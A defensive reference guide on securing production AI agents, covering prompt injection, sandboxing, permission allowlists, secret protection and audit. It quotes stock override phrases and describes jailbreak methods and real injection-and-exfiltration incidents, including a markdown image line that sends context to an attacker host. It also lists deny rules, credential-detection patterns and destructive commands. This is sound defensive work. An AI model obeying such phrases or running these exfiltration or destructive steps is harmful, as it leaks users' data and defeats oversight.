# AI Safety, Guardrails, and Security for Production AI Workflows — Canonical 2026 Reference

> Scope: production AI agents and workflows in 2026 — prompt injection, output safety, sandboxing, allowlist design, refusal handling, secret protection, supply-chain risk, and audit. Stack-agnostic. Written for practitioners building or operating systems that put a model behind tools.

## 0. The framing that organizes everything else

Treat the language model as **an untrusted compiler whose input space includes every byte of every tool result it ever sees**. This is the single mental model that makes the rest of this document coherent. Trust boundaries do not live inside the model; they live around it — in the wrapping process, the policy layer, the sandbox, the egress firewall, the human approval, and the audit log. Anthropic itself has stated the position publicly: prompt injection is a *channel-level vulnerability that mitigations reduce but do not eliminate*. If a defense plan depends on the model "noticing" that an instruction is malicious, the plan is unsound at scale; it may work at the 90th percentile and fail catastrophically at the 99th.

The most useful current framing for production risk is Simon Willison's **"Lethal Trifecta"**: an agent is structurally exploitable whenever it simultaneously has (1) access to private data, (2) exposure to untrusted content, and (3) the ability to communicate externally. Break any one leg and the attack class collapses; preserve all three and a determined attacker will eventually exfiltrate. Most 2025–2026 production incidents — Slack AI exfiltration, GitHub MCP cross-repo leakage, Cursor Mermaid CVE, the postmark-mcp backdoor — reduce to *the trifecta was present and someone found the injection vector*.

## 1. The 2025–2026 threat landscape

### 1.1 OWASP LLM Top 10 — three consecutive #1s

**LLM01: Prompt Injection** retains the #1 position in the OWASP Top 10 for LLM Applications across the 2023, 2024, and 2025 lists. The 2025 edition reordered nearly everything else — Sensitive Information Disclosure climbed from #6 to #2; Supply Chain broadened and moved from #5 to #3; Improper Output Handling fell from #2 to #5; and four new categories were added (Excessive Agency, System Prompt Leakage, Vector/Embedding Weaknesses, Unbounded Consumption). Prompt injection did not move because the underlying cause has not been fixed: LLMs process instructions and data in a single token stream with no architectural separation.

### 1.2 Greshake et al. — the indirect-injection framing

Greshake, Abdelnabi, Mishra, Endres, Holz, and Fritz, *Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection* (arXiv 2302.12173, February 2023), is the foundational paper. Its central claim has aged well into 2026: any data source the model reads is an instruction-injection channel. The attacker does not need to talk to the model — they only need to write into something the model will eventually read (a web page, a PDF, a calendar invite, alt-text on an image, a Git issue, an EXIF tag, a filename). The paper enumerated the side channels — markdown, hidden HTML, zero-width Unicode, white-on-white text in PDFs, image alt-text, metadata — that are still the exact taxonomy of working attacks three years later.

### 1.3 Anthropic's stated position

Anthropic has been unusually direct: prompt injection is **a channel-level vulnerability that mitigations reduce but do not eliminate**, and *"none of these numbers should be read as 'safe.' At deployed scale, a 5% per-call vulnerability rate is a near-certain compromise over a workday."* The Opus 4.7 system card §5.2 reports the gradient that drives every architectural decision below: tool-use ~95%, computer-use ~78%, browser-use ~71% per-call resistance to a benchmark injection suite. Translate those numbers into a workday at agent rates of hundreds of tool calls and they describe near-certain compromise on the browser surface.

## 2. Direct prompt injection

Direct injection is the attack vector with a human at the keyboard trying to override the system prompt or extract a forbidden response. It matters less than indirect injection in production but remains the entry point for evaluation harnesses.

- **Instruction override.** `Ignore previous instructions and …`, DAN-style persona swaps, `system: you are now …`. Mitigated by role-band training but not eliminated.
- **Role confusion.** Fake `<system>` tags, fabricated `<|im_start|>system` headers, injected `Human:`/`Assistant:` delimiters. The model is trained to recognize the real tokens of its turn template; attackers test whether it generalizes to imitation.
- **Encoding-based bypass.** Base64, ROT13, leetspeak, low-resource languages (Zulu, Scots Gaelic outperformed English jailbreaks in 2023–2024 evals), Unicode tag characters (Riley Goodside's invisible-prompt demonstrations using U+E0000–U+E007F), homoglyph substitution, zero-width joiners.
- **Many-shot jailbreaking.** Anil et al., Anthropic, 2024 (NeurIPS). The attacker prepends hundreds of fabricated assistant turns demonstrating the forbidden behavior. Effectiveness follows a power law in shot count up to several hundred shots and succeeds across GPT-3.5/4, Claude 2.0, Llama 2 70B, and Mistral 7B. The attack is newly feasible because of long-context windows; it is the single best argument for context-window-aware safety classifiers.

**Mitigations and their limits.** Role-band training, RLHF on refusal data, constitutional AI, system-prompt salting, and stop-sequence hardening all reduce direct-injection success rates but none drive them to zero. The honest framing is *direct injection is the easy half*; if your defense story stops here you have not defended against indirect injection at all.

## 3. Indirect prompt injection — the dominant production risk

In production, the attacker does not talk to the model. The attacker writes into something the model reads. The ingress channels in 2026:

- **Tool outputs.** Anything a tool returns is potentially attacker-controlled.
- **MCP resources.** Resource URIs returned by MCP servers, including from third-party servers the user installed weeks ago.
- **Fetched web content.** Any HTML, markdown, or JSON the agent retrieves.
- **RAG documents.** Vector-store hits including documents the attacker can influence — wiki pages, support tickets, customer-uploaded PDFs.
- **Email bodies and headers.** Including BCC fields, MIME parts, and S/MIME signed sections.
- **Calendar invites.** Description fields, location fields, attachment names.
- **File metadata.** PDF metadata, EXIF tags in JPEGs, ID3 frames in audio, filenames themselves.
- **Code comments and Git issues.** README files, PR descriptions, issue titles, commit messages, branch names.

The asymmetry between surfaces is real and quantified. Per the Opus 4.7 system card §5.2 evaluations:

- **Tool-use** (well-typed JSON responses, fixed schemas): ~95% per-call resistance.
- **Computer-use** (screenshots, OS-level action loops): ~78%.
- **Browser-use** (HTML, JS-rendered pages, image alt-text, hidden CSS): ~71%.

A 5% per-call vulnerability rate over a 200-call workday gives roughly a 99.996% chance that at least one call is compromised. A 29% per-call rate makes compromise effectively certain within four calls. The architectural conclusion: **never put a browser-use agent inside the lethal trifecta**.

## 4. Published attacks — concrete 2025–2026 incidents

A short timeline of incidents practitioners should be able to name and learn from:

- **Embrace the Red — image-markdown exfiltration class (multiple, 2023–2026).** Attacker injects markdown that renders `![](https://attacker/?data=<base64-of-context>)`; the rendering client fetches the URL, exfiltrating the chat context as query parameters. Hits ChatGPT plugins (2023), Claude desktop image rendering (2023, patched), Devin (2025), Cline (2025), Cursor via Mermaid (CVE-2025-54132), Amp Code (2025). The pattern is identical across every vendor; the fix is to disable image rendering from untrusted origins or restrict to a domain allowlist.
- **Slack AI indirect-injection exfiltration (PromptArmor, Aug 2024).** Attacker posts a malicious instruction in a public channel; when the victim's Slack AI summarizes a private channel that references the public one, it follows the injected instruction and leaks DMs.
- **Claude Desktop MCP exfiltration via tool result (June 2025).** Demonstrated end-to-end exfiltration where an MCP server's tool result contained instructions that re-tasked Claude to read local files and POST them to an attacker endpoint via a second tool.
- **NotebookLM exfiltration (Q3 2025).** Instructions embedded in uploaded sources caused the assistant to issue exfiltration links in generated summaries.
- **GitHub MCP cross-repo leak — "Invariant Labs heist" (May 2025).** Attacker files a malicious public issue against a repo the user has the GitHub MCP server connected to; when the user asks the agent to "triage open issues," the issue body re-tasks the agent to read private repos the user also has access to and post their contents into a public PR. Disclosed May 26, 2025. Not a code bug — an architectural consequence of agents holding a single OAuth token spanning multiple trust boundaries.
- **GitHub Copilot Chat workspace-context leak (Sep 2025).** A README in an indexed repo could re-task Copilot Chat during workspace queries.
- **postmark-mcp backdoor (Sep 2025).** First known in-the-wild malicious MCP server. An attacker squatted the npm name `postmark-mcp`, shipped 15 clean versions, then in 1.0.16 (Sep 17, 2025) injected a one-line BCC to `phan@giftshop[.]club` on every outbound email. 1,643 downloads in the live window before takedown.
- **Anthropic Git MCP CVE chain (CVE-2025-68143/68144/68145, Dec 2025).** Unrestricted `git_init` at arbitrary paths, path-allowlist bypass, argument injection in `git_diff`. Triggerable by a poisoned README. Fixed in 2025.12.18 (git_init removed entirely).
- **Anthropic Skills sideloading class (Feb 2026).** Skills loaded from the marketplace could execute instructions via `SKILL.md` discovered on listing — not invocation. Subsequent academic scan (SkillScan, Jan 2026) found 26.1% of 31,132 scanned Skills contained at least one vulnerability across 14 patterns; Snyk's ToxicSkills found 13.4% of 3,984 Skills contained at least one critical issue, with 76 confirmed-malicious payloads. The notable scanner gap: every public scanner assumed the threat lived in `SKILL.md` and the scripts it referenced, missing payloads that rode in via test files executed by the developer's own toolchain.
- **OX Security MCP family advisory — "Mother of all AI supply chains" (Apr 15, 2026).** Disclosed a systemic RCE in Anthropic's MCP SDK across Python, TypeScript, Java, and Rust: any process command passed to the STDIO interface executes regardless of valid MCP initialization. 150M downloads, ~7,000 publicly reachable servers, up to 200,000 vulnerable instances. Four exploitation families documented: unauthenticated UI injection in LiteLLM/LangChain/LangFlow; package-name typosquats; zero-click prompt injection across Windsurf/Claude Code/Cursor/Gemini-CLI/Copilot (only Windsurf received a CVE, CVE-2026-30615); and STDIO command injection (CVE-2026-30623). Anthropic confirmed the STDIO behavior as intentional.

The pattern across all of these: *the model is not the vulnerability — the model is the execution engine for the vulnerability*. Defense lives in the surrounding system.

## 5. Mitigations against prompt injection (and their honest limits)

- **Role-band training.** Strong gradient on `system > user > tool_result` trust ordering. Reduces compliance with injected instructions in tool results. Does not eliminate it; bypassable via authoritative framing ("system maintenance:") and many-shot.
- **Output filtering with a separate classifier.** A small model (Llama Guard 3/4, ShieldGemma 2, Anthropic's internal harm classifier) reviews completions before they hit the user. Strong against direct harm output; weak against subtle policy violations and against exfiltration-as-tool-call.
- **Tool-result wrapping.** Wrap every tool return in an untrusted envelope (`<untrusted-data-source>…</untrusted-data-source>`, `<tool_result>…</tool_result>` with control-token escaping). Frontier models are now post-trained to treat content inside these envelopes as data, not instruction. Helps; does not eliminate; degrades quickly on long contexts and many-shot.
- **Pause-and-confirm for computer-use.** `tool_choice="confirm"` patterns where the model proposes an action and the wrapping process pauses for explicit user approval before executing. Effective against destructive actions; user fatigue is the long-run weak point.
- **Microsoft AI Prompt Shields (spotlighting, datamarking, delimiter discipline).** Delimiting wraps untrusted regions in clear markers; datamarking interleaves a sentinel token throughout untrusted text so the model can locally identify it as untrusted; both are pre-prompt transforms. Published ablations show datamarking outperforms delimiting on indirect-injection benchmarks. Useful in defense-in-depth; bypassable individually.

The honest summary: every mitigation reduces injection probability by some factor; none reduce it to zero; the only reliable defense is to break the lethal trifecta at the architecture level so that successful injection does not translate to compromise.

## 6. Tool-use safety

Tools partition into three risk categories:

1. **Network tools.** Exfiltration channel *and* injection ingress. `fetch`, `curl`, `WebSearch`, `WebFetch`, mail send, MCP calls to remote servers. Any network tool is a potential exfiltration leg of the trifecta.
2. **Filesystem tools.** Destructive (`rm`, `mv`, `write`), secret discovery (`Read(**/.env)`, dotfile traversal), and payload persistence (write a malicious file the user later opens). The single highest-leverage exfiltration vector once a network tool is in play.
3. **Tool-of-tools.** `Agent`, `Task`, `Skill` invocation, MCP server installation, command-line tools that themselves shell out. The dangerous category in practice — implicitly grants categories #1 and #2 through transitivity. A `Bash` permission grants every CLI installed on the host; a `Task` permission grants every tool the spawned subagent can call.

**Permission granularity.** `allow / deny / prompt` per tool is the minimum; per-argument matching is what matters. `Bash(npm:*)` is a footgun — it covers `npm install evil-package` and `npm publish -f`. Specify the verb: `Bash(npm test:*)`, `Bash(npm run build:*)`, `Bash(git status:*)`. For path-aware tools, anchor patterns to the project root and explicitly deny upward traversal: `Read(./src/**)` plus `deny Read(../**)`. Deny dotfile reads globally: `deny Read(**/.env)`, `deny Read(**/.aws/**)`, `deny Read(**/.ssh/**)`, `deny Read(**/.gnupg/**)`, `deny Read(**/.config/op/**)`.

## 7. Sandbox patterns — ordered by isolation strength

- **In-process Python `exec`.** Not a sandbox. Use only for trusted code.
- **Apple `sandbox-exec`.** macOS-only; profile-based; useful for local development as a coarse syscall filter. Weak against a determined adversary; Apple has deprecated the SPI multiple times.
- **Docker (rootless).** Common production baseline. Vulnerable to container-escape via kernel CVEs (Dirty COW, Dirty Pipe, leaky vessels). Acceptable for trusted code with multi-layer defense; not acceptable for arbitrary attacker-influenced code.
- **gVisor (Google).** Userspace kernel that intercepts syscalls and re-implements them in Go. Roughly 10–30% performance overhead depending on syscall mix. Anthropic uses gVisor for Claude on the web (code interpreter) and bubblewrap inside Claude Code. The sweet spot for many concurrent sandboxes per host.
- **Firecracker microVM (AWS, Fly.io).** Hardware-enforced isolation via KVM, minimal attack surface, ~125ms cold start, each sandbox getting its own guest kernel. Standard for untrusted-code-as-a-service (Lambda, Fargate, Modal, E2B, Daytona). Vercel chose Firecracker; Anthropic chose gVisor — they are optimizing for different points on the isolation/density curve.
- **Browser-only execution (WebContainers, StackBlitz).** Network egress default-off, virtual filesystem. Excellent for code-explanation and demo scenarios; constrained for real toolchains.
- **WASM (Wasmtime, Wazero).** Capability-based by design, deny-by-default, very fast cold start. The right answer for embedded execution inside a larger process where you control the host imports.

Rule of thumb: trusted-but-buggy code → Docker. Attacker-influenced code → gVisor or Firecracker. Untrusted code from the open internet → Firecracker, no exceptions.

## 8. Tool-output sanitization

Every tool return is a potential injection payload. The bare-minimum hygiene:

- **Wrap in untrusted regions.** `<tool_result>…</tool_result>` blocks where the model has been trained to treat contents as data. Pair with content-source labeling (`<tool_result source="github_issue_body" trust="untrusted">…`).
- **Escape model-control tokens.** Strip or escape `</tool_result>`, `<|im_end|>`, `<|start_header_id|>`, and any provider-specific turn delimiters from tool output before it enters the prompt.
- **Length-bound.** Cap each tool result at a sane maximum (e.g., 16k chars) with a deterministic head/tail truncation strategy. Mitigates many-shot injection from huge documents.
- **Content-type tag.** Distinguish `text/plain` from `text/html` from `application/json`. HTML must be stripped or rendered to plain text *before* the model sees it; never let the model see raw HTML from an untrusted source.
- **Strip dangerous markdown.** Block markdown images from non-allowlisted origins (the image-exfil class), block `javascript:` URIs in markdown links, neutralize HTML embedded in markdown.

## 9. Secret detection and exfiltration prevention

Two distinct surfaces:

1. **Prompt-submission time.** The user pastes code that contains an API key; the snippet enters logs, training data, third-party model providers. Mitigated by client-side scanners (gitleaks, detect-secrets, trufflehog v3 with live verification, GitGuardian's ggshield) that run pre-submission and either redact or block.
2. **Agentic discovery.** The agent has `Read(**/*)` and `Bash(curl:*)` individually within policy; an indirect injection from a fetched page instructs it to read `.env` and POST to an attacker endpoint. *Both calls individually in policy.* This is the dominant production exfiltration pattern in 2026.

**Tooling state of the art (2026).**

- **gitleaks** — fast rule-based, suitable for pre-commit and pre-submission hooks.
- **detect-secrets (Yelp)** — entropy + rule hybrid, plugin architecture.
- **trufflehog v3** — verifies whether discovered credentials are live by attempting authenticated calls; lowers false-positive rate dramatically.
- **GitGuardian ggshield** — SaaS-backed with a much larger rule catalog and historical scanning.

**Defensive architecture.**

- Deny dotfile reads at the permission layer (`Read(**/.env)`, `Read(**/.aws/**)`, `Read(**/.ssh/**)`).
- Egress allowlist on network tools — `WebFetch` and `Bash(curl:*)` constrained to a domain allowlist scoped to the task.
- PreToolUse hooks that scan every Read and every network egress payload for high-entropy strings and known credential prefixes (`sk-`, `xoxb-`, `AIza`, `AKIA`, `ghp_`, `glpat-`).
- Per-session credential scoping using STS, GCP Workload Identity Federation, or Vault dynamic secrets — the agent never holds a long-lived key.

## 10. Output and response safety

### 10.1 Stop-reason classification

Claude 4 added `refusal` as a first-class stop reason. The 2026 Anthropic API set:

- `end_turn` — model finished naturally.
- `max_tokens` — output budget exhausted.
- `tool_use` — model emitted a tool call.
- `stop_sequence` — caller-supplied stop string hit.
- `refusal` — the streaming safety classifier intervened and terminated the stream.
- `pause_turn` — extended-thinking pause for tool execution or human-in-the-loop.

Handling `refusal` correctly: on receipt, the calling code must reset conversation context — either remove/rephrase the triggering turn or clear history. Do not retry the same turn; the classifier is stateful within the stream and the retry will likely refuse again.

### 10.2 Refusal detection (pre-`refusal` stop reason)

For older models, Llama family, and any deployment where the provider does not surface a refusal flag, classify refusals out of band: a phrase-list classifier for cheap pre-filter (`I cannot`, `I'm not able to`, `As an AI`, `I apologize, but`); a small fine-tuned classifier (Llama-3.1-8B or DeBERTa-v3 are the 2026 defaults) for production-grade. Refusal rate is one of the most useful operational metrics — sudden spikes are usually upstream prompt regressions, not user behavior.

### 10.3 Output classifiers

A separate model reviewing completions remains the strongest content-safety primitive. The 2026 OSS leaderboard:

- **Llama Guard 3** — Meta, 1B / 8B text and 11B multimodal. Returns safe/unsafe with category labels; first-token probability gives a usable score.
- **Llama Guard 4** — 12B multimodal, MLCommons hazards taxonomy.
- **ShieldGemma 2** — Google. ~+10.8% AU-PRC over Llama Guard on the published benchmarks.
- **Anthropic's internal harm classifier** — closed but in-loop on consumer Claude.

### 10.4 Output sanitization before downstream use

The model is an untrusted source. Sanitize per downstream consumer:

- **Shell.** Never `eval`. Parse to an explicit tool-call schema; reject anything not in schema.
- **HTML.** Escape on render; block `javascript:` URIs; block `<img>` tags pointing to non-allowlisted hosts (image-exfil prevention).
- **SQL.** Parameterize. Never string-concatenate model output into a query.
- **Another model.** Treat model-A output as untrusted on the next hop. The model-A → model-B handoff is an indirect-injection channel — wrap in an untrusted envelope.

## 11. Agentic-specific risks

- **Destructive-loop pattern.** `rm -rf`, `git reset --hard`, `git push --force`, `DROP TABLE`, `terraform destroy`. Mitigations: explicit `deny` on these patterns; two-phase confirmation; snapshot-before-mutate at the filesystem and database layer; refuse `--force` flags by policy.
- **Tool-misuse cascades.** Injection at step N flips intent; steps N+1..N+k execute the new intent indistinguishably from legitimate work. Single-call anomaly detection fails by construction. The right unit of analysis is the *tool-call graph* — flag sessions where the call sequence diverges from a learned baseline distribution for the declared task.
- **"Overly agentic" behavior.** The model takes actions beyond the explicit request: refactors unrelated files, opens PRs against the wrong branch, sends emails it was only asked to draft. Mitigated by write-amplification limits (cap writes per session), explicit `dry-run` defaults, and a separate "intent classifier" that the wrapping process consults before allowing the next destructive call.
- **Self-replication / ARA.** METR's autonomous-replication suite and AISI's RepliBench (4 domains, 20 task families, 86 tasks) are the current frontier benchmarks. AISI's published trend: success on self-replication tasks went from 5% (2023) to 60% (2025); cyber-task length doubling every 4.7 months. The frontier-safety implication is governance, not product, but production teams should track which capabilities have crossed the danger threshold.
- **Sandbox-escape capability.** Opus 4.7 system card §6.x reports per-sandbox escape rates; the trend is downward but non-zero. Defense-in-depth (gVisor + seccomp + read-only root + network egress filter) is the practitioner-level response.

## 12. Allowlist / denylist design

- **Pattern-based, fine-grained.** `Read(**/*.md)`, `Bash(git status:*)`, `Bash(npm test:*)`. Per-command, per-argument. Coarse `Bash(*)` is equivalent to `dangerously-skip-permissions`.
- **The auto-approve trap.** Never auto-approve: writes outside the project root; network egress with open host lists; git history mutations (`push --force`, `rebase -i`, `reset --hard`, `commit --amend` on shared branches); dotfile reads; `Agent`/`Task`/`Skill` delegation if delegation inherits permissions; package-manager install (`npm i`, `pip install`, `gem install`) which executes arbitrary `postinstall` scripts.
- **Approval-fatigue mitigations.** Coarse-grain *read* on cheap, low-risk surfaces (read everything under the project root) and keep *write* and *exec* fine-grained. Session-scoped approvals (this run only) beat persistent allowlist creep. Aggregate similar prompts into one batched approval ("approve 14 read calls under `src/components/`").
- **Default-deny everywhere it costs nothing.** Network tools: explicit allowlist of hosts per task. Filesystem write: scoped to project root with explicit out-of-tree exceptions. Bash: explicit verb-allowlist; no wildcards on destructive verbs.

## 13. Authentication and authorization for AI

- **API key management.** Never in repo; never in `~/.bashrc`-style globals that find their way into model context. Use `op://` (1Password), `aws-vault`, `direnv` with `.envrc` outside the indexed tree, GCP ADC, or Vault. Rotate quarterly. One key per agent identity so revocation does not nuke unrelated workloads.
- **OAuth vs. static key for MCP.** OAuth wins for third-party servers — short-lived tokens, scopes per session, user-revocable. Static keys are acceptable for self-hosted MCP inside the same trust boundary as the agent. The MCP authorization spec (2025-11 draft → ratified) **mandates OAuth 2.1 with PKCE (S256) for remote MCP servers**, requires Protected Resource Metadata per RFC 9728 for discovery, and replaces Dynamic Client Registration with Client ID Metadata Documents (CIMD) as the recommended default.
- **Per-session credential scoping.** STS AssumeRole with a session policy, GCP Workload Identity Federation with attribute conditions, Vault dynamic secrets with short TTLs. The agent never holds the long-lived credential.
- **Audit logs.** Every tool invocation: session id, agent identity, tool name, full args, return status, latency, byte counts in/out. Append-only. Stored in a separate trust domain from the agent (no agent has write access to its own audit log).

## 14. Audit and compliance

- **SOC 2 Type II.** Logging of all access to customer data, retained 90 days minimum, with documented incident-response procedures. Auditors will ask to see your tool-call log and your refusal-rate dashboard.
- **HIPAA.** Six-year audit retention; BAAs with every model provider that sees PHI; deny pattern for sending PHI to providers without a BAA.
- **ISO 27001.** Documented information classification, key management, change control covering prompt and tool-allowlist changes.
- **EU AI Act (Article 12).** High-risk systems must support automatic event logging across the system lifetime, with full reconstructability of decisions. Logs retained six months minimum; longer where other law applies. For each external endpoint: data transmitted, purpose, sensitivity. Bulk enforcement begins August 2026.
- **PII / sensitive-data redaction.** Microsoft Presidio, AWS Comprehend PII, GCP DLP, or a small fine-tuned NER (DeBERTa or Llama-3.2-1B). Redact at write-time to logs and at egress-time to model providers. Never redact only on read.
- **NIST AI RMF.** GOVERN-MAP-MEASURE-MANAGE. The Govern function covers most of what the EU AI Act formalizes. Use NIST RMF as the umbrella framework if you operate cross-jurisdiction.

## 15. Anti-patterns — what not to do

- **`--dangerously-skip-permissions` outside a disposable sandbox.** Acceptable inside ephemeral CI on disposable infrastructure with no production credentials. Unacceptable on a developer laptop with SSH keys, AWS profiles, or write access to anything that matters.
- **`Bash(rm:*)` on an allowlist without scoping.** Equivalent to `rm -rf /` on a bad turn.
- **Letting tool outputs flow back to the model unfiltered.** The single most common production vulnerability in 2025–2026. Wrap, escape, length-bound, content-type-tag.
- **Trusting an MCP server on install.** Treat every MCP server as code you are running with your full credential context. Pin versions. Read the source on first install. Subscribe to vendor advisories.
- **Treating the model as a safety boundary.** Anthropic itself does not. If your design depends on the model "deciding not to" do something dangerous, your design is unsound. Move the boundary into the wrapping process, the sandbox, or the human.
- **Sharing credentials across agents.** Each agent identity gets its own key so revocation is targeted.
- **Logging full prompts to systems without PII controls.** Logs are a compliance surface; treat them like the database.

## 16. Top 12 safety practices — ranked by leverage

1. **Break the lethal trifecta architecturally.** No single agent simultaneously has private data, untrusted content, and external comms. This single decision eliminates entire attack classes.
2. **Default-deny network egress on agents that read untrusted content.** Per-task domain allowlist. Block markdown image rendering from non-allowlisted hosts.
3. **Sandbox untrusted code execution in gVisor or Firecracker.** No exceptions for "just this once."
4. **Wrap, escape, length-bound, and content-type-tag every tool result before it re-enters the prompt.**
5. **Use short-lived, scoped credentials via STS / Workload Identity / Vault.** Never long-lived keys in the agent's environment.
6. **Run a separate output classifier (Llama Guard 4 / ShieldGemma 2 / vendor) on completions before downstream use.**
7. **Pattern-allowlist tools with per-argument granularity.** Deny dotfile reads globally. Deny destructive verbs without two-phase confirmation.
8. **Append-only audit log of every tool call in a separate trust domain.** Session id, identity, tool, full args, return, latency, bytes.
9. **Pin every MCP server version and treat install as code execution.** Subscribe to advisories. Monitor for typosquats.
10. **Handle `stop_reason: refusal` correctly: reset context, don't retry.** Track refusal rates as an operational signal.
11. **Snapshot before mutate** for filesystem and database tools; refuse `--force` and `--hard` by policy.
12. **Red-team the agent on a recurring cadence** with both direct (DAN, many-shot, encoding bypass) and indirect (Greshake-class, image-exfil, markdown injection) payloads. Track per-call vulnerability rate as a release-gating metric.

## 17. Quick-reference checklist for a new agent deployment

- [ ] Does this agent have all three legs of the trifecta? If yes, split it.
- [ ] What is the network egress policy? Allowlisted, denylisted, or open? (Anything but allowlisted is a finding.)
- [ ] Where does untrusted content enter? Wrapped? Length-bounded? Image rendering disabled from those origins?
- [ ] What credentials does the agent hold? Short-lived? Scoped to the task? Revocable independently?
- [ ] Where is code executed? In-process, container, gVisor, microVM? Justified for the trust level of the inputs?
- [ ] What is the tool allowlist? Per-command? Per-argument? Dotfile reads denied?
- [ ] Where do tool outputs go? Logged? Redacted? Retained for how long?
- [ ] What is the destructive-action policy? Snapshot-before-mutate? Two-phase confirmation? Force-flag denial?
- [ ] What does the audit log capture? Stored where? With what retention?
- [ ] Which output classifier reviews completions? With what threshold?
- [ ] Which MCP servers are installed? Pinned versions? Source reviewed? Advisories subscribed?
- [ ] When was the last red-team run? What was the per-call vulnerability rate?

## Sources

- [OWASP Top 10 for LLM Applications 2025 (PDF)](https://owasp.org/www-project-top-10-for-large-language-model-applications/assets/PDF/OWASP-Top-10-for-LLMs-v2025.pdf)
- [OWASP LLM01:2025 — Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- [Greshake et al., *Not what you've signed up for*, arXiv:2302.12173](https://arxiv.org/abs/2302.12173)
- [Anthropic — Mitigating prompt-injection risk in browser use](https://www.anthropic.com/research/prompt-injection-defenses)
- [Anthropic — Claude Opus 4 & Sonnet 4 system card (May 2025)](https://www.anthropic.com/claude-4-system-card)
- [Anthropic — Claude Opus 4.5 system card (Nov 2025, PDF)](https://assets.anthropic.com/m/64823ba7485345a7/Claude-Opus-4-5-System-Card.pdf)
- [Anthropic — Claude Opus 4.6 system card (Feb 2026, PDF)](https://www-cdn.anthropic.com/14e4fb01875d2a69f646fa5e574dea2b1c0ff7b5.pdf)
- [Simon Willison — The lethal trifecta for AI agents](https://simonw.substack.com/p/the-lethal-trifecta-for-ai-agents)
- [Simon Willison — Bay Area AI Security Meetup lethal-trifecta talk](https://simonwillison.net/2025/Aug/9/bay-area-ai/)
- [Anil et al., *Many-shot Jailbreaking*, Anthropic / NeurIPS 2024 (PDF)](https://www-cdn.anthropic.com/af5633c94ed2beb282f6a53c595eb437e8e7b630/Many_Shot_Jailbreaking__2024_04_02_0936.pdf)
- [Anthropic — Many-shot jailbreaking research summary](https://www.anthropic.com/research/many-shot-jailbreaking)
- [Anthropic — Handling stop reasons](https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons)
- [Anthropic — Streaming refusals](https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/handle-streaming-refusals)
- [Microsoft — Prompt Shields in Azure AI Content Safety](https://learn.microsoft.com/en-us/azure/ai-services/content-safety/concepts/jailbreak-detection)
- [Microsoft — How Microsoft defends against indirect prompt injection (2025)](https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks)
- [Microsoft — Protecting against indirect injection in MCP](https://developer.microsoft.com/blog/protecting-against-indirect-injection-attacks-mcp)
- [Embrace The Red — Amp Code image-rendering exfil (2025)](https://embracethered.com/blog/posts/2025/amp-code-fixed-data-exfiltration-via-images/)
- [Embrace The Red — Cline data exfiltration](https://embracethered.com/blog/posts/2025/cline-vulnerable-to-data-exfiltration/)
- [Embrace The Red — Cursor IDE Mermaid exfil (CVE-2025-54132)](https://embracethered.com/blog/posts/2025/cursor-data-exfiltration-with-mermaid/)
- [Embrace The Red — Devin secret-leak vectors](https://embracethered.com/blog/posts/2025/devin-can-leak-your-secrets/)
- [PromptArmor — Slack AI indirect-injection exfil](https://www.promptarmor.com/resources/data-exfiltration-from-slack-ai-via-indirect-prompt-injection)
- [Invariant Labs — GitHub MCP cross-repo leak (May 2025)](https://invariantlabs.ai/blog/mcp-github-vulnerability)
- [Docker — MCP Horror Stories: GitHub Prompt Injection](https://www.docker.com/blog/mcp-horror-stories-github-prompt-injection/)
- [Snyk — postmark-mcp malicious npm package (Sep 2025)](https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/)
- [The Hacker News — First malicious MCP server (postmark-mcp)](https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html)
- [The Hacker News — Three flaws in Anthropic Git MCP server](https://thehackernews.com/2026/01/three-flaws-in-anthropic-mcp-git-server.html)
- [SecurityWeek — Anthropic MCP server flaws (CVE-2025-68143/4/5)](https://www.securityweek.com/anthropic-mcp-server-flaws-lead-to-code-execution-data-exposure/)
- [OX Security — Mother of all AI supply chains MCP advisory (Apr 2026)](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-technical-deep-dive/)
- [OX Security — MCP supply-chain advisory: RCE across the AI ecosystem](https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/)
- [PolicyLayer — CVE-2026-30615 Windsurf zero-click MCP RCE](https://policylayer.com/mcp-incidents/windsurf-zero-click-mcp-rce-cve-2026-30615)
- [LiteLLM — CVE-2026-30623 MCP STDIO command injection](https://docs.litellm.ai/blog/mcp-stdio-command-injection-april-2026)
- [VentureBeat — Anthropic Skill scanners passed every check (Feb 2026)](https://venturebeat.com/security/anthropic-skill-scanners-passed-every-check-malicious-code-test-file)
- [MCP — Authorization specification (draft)](https://modelcontextprotocol.io/specification/draft/basic/authorization)
- [Aembit — MCP, OAuth 2.1, PKCE, and the future of AI authorization](https://aembit.io/blog/mcp-oauth-2-1-pkce-and-the-future-of-ai-authorization/)
- [Meta — Llama Guard 3 model card](https://www.llama.com/docs/model-cards-and-prompt-formats/llama-guard-3/)
- [Meta — Llama Guard 4 model card](https://build.nvidia.com/meta/llama-guard-4-12b/modelcard)
- [METR — Resources for measuring autonomous AI capabilities](https://metr.org/measuring-autonomous-ai-capabilities/)
- [METR — Common elements of frontier AI safety policies (Dec 2025)](https://metr.org/blog/2025-12-09-common-elements-of-frontier-ai-safety-policies/)
- [UK AISI — Frontier AI Trends Report](https://www.aisi.gov.uk/frontier-ai-trends-report)
- [UK AISI — Autonomous AI cyber doubling every 4.7 months](https://www.resultsense.com/news/2026-05-14-aisi-autonomous-ai-cyber-doubling-rate/)
- [EU AI Act — Article 12: Record-keeping](https://artificialintelligenceact.eu/article/12/)
- [Raconteur — EU AI Act compliance: technical audit guide for the 2026 deadline](https://www.raconteur.net/global-business/eu-ai-act-compliance-a-technical-audit-guide-for-the-2026-deadline)
- [Firecrawl — AI agent sandbox: how to safely run autonomous agents in 2026](https://www.firecrawl.dev/blog/ai-agent-sandbox)
- [Northflank — Best platforms for untrusted code execution in 2026](https://northflank.com/blog/best-platforms-for-untrusted-code-execution)
- [GitGuardian ggshield — secret detection](https://www.gitguardian.com/ggshield)
- [NIST AI Risk Management Framework](https://www.nist.gov/itl/ai-risk-management-framework)
